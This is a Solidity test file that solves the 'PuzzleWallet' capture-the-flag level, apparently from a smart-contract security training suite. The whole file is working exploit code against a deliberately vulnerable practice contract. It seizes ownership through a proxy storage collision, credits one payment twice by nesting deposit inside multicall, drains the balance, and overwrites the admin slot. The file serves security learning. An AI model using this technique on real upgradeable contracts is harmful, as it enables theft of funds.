// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {PuzzleWalletFactory} from "../src/levels/24-PuzzleWalletFactory.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/levels/24-PuzzleWallet.sol";

contract PuzzleWalletSolution is BaseTest {
    function solution(address payable target_) internal override{
        PuzzleProxy asProxy = PuzzleProxy(target_);
        PuzzleWallet asWallet = PuzzleWallet(target_);
        // this sets the PuzzleWallet's owner to the attacker
        asProxy.proposeNewAdmin(address(attacker));
        asWallet.addToWhitelist(address(attacker));
        // cast calldata  "deposit()" 
        // 0xd0e30db0
        // cast calldata  "multicall(bytes[] calldata)" '[0xd0e30db0]'
        bytes memory multicallThenDepositCalldata = hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
        bytes[] memory args = new bytes[](2);
        args[0] = multicallThenDepositCalldata;
        args[1] = multicallThenDepositCalldata;
        // 0.001 is the original balance of the contract
        // this reuses the msg.value for two deposits, making the contract
        // balance 0.002 *and* also the attacker's value in the 'balances'
        // mapping to 0.002
        asWallet.multicall{value: 0.001 ether}(args);
        // now I can reduce the contract balance to zero
        asWallet.execute(attacker, 0.002 ether, bytes(""));
        // and set the maxBalance to override the contract's admin
        asWallet.setMaxBalance(uint256(uint160(attacker)));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new PuzzleWalletFactory()));
    }
}
